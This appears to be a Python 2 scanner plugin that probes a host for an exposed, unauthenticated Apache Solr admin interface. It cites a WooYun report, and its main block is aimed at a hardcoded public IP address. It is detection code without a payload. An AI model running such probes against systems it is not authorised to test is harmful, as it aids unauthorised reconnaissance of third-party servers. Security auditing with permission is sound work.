#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  Apache SOLR 未授权访问
Author    :  a
mail      :  a@lcx.cc
Referer   : http://www.wooyun.org/bugs/wooyun-2015-0105302
"""

import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'solr/#/'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl("%s" % url)
    if code == 200 and  'Apache SOLR' in res :
        security_info(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://23.21.164.138/')[1])
